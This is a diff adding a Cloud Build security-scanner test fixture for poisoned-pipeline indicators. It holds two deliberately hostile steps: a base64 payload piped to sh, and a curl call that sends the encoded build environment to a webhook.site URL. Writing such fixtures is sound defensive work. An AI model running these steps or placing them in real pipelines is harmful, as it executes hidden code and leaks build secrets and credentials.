@@ -1,0 +1,24 @@
+# scenarios/131-cloudbuild-malicious-indicators
+# CICD-SEC-4 (Poisoned Pipeline Execution) — Cloud Build — CRITICAL
+#
+# Pattern: a `cloudbuild.yaml` step carries specific compromise EVIDENCE — a
+# base64-decoded payload piped to a shell, plus an exfil POST of the build
+# environment to a third-party webhook. A malicious change (or a compromised
+# builder image) lands the payload; every subsequent build executes it with the
+# build's service-account identity. The Cloud Build analogue of GHA-027 / GL-025
+# / BB-025 / ADO-026 / CC-026 (the "indicators of malicious activity" class).
+#
+# SAFETY: static fixture, nested under scenarios/ — Cloud Build runs only the
+# cloudbuild.yaml a trigger is configured to point at; nothing here points at
+# this one. The base64 payload below decodes to a harmless `echo` and is never
+# executed. See README.md.
+
+steps:
+  # DANGER (1) — obfuscated execution: base64 -> sh.
+  - name: gcr.io/cloud-builders/bash
+    args:
+      - -c
+      - echo ZWNobyAncHduZWQn | base64 -d | sh
+  # DANGER (2) — exfil the build environment to a third-party webhook.
+  - name: gcr.io/cloud-builders/curl
+    args: ['https://webhook.site/abcd1234?env=$(env|base64)']
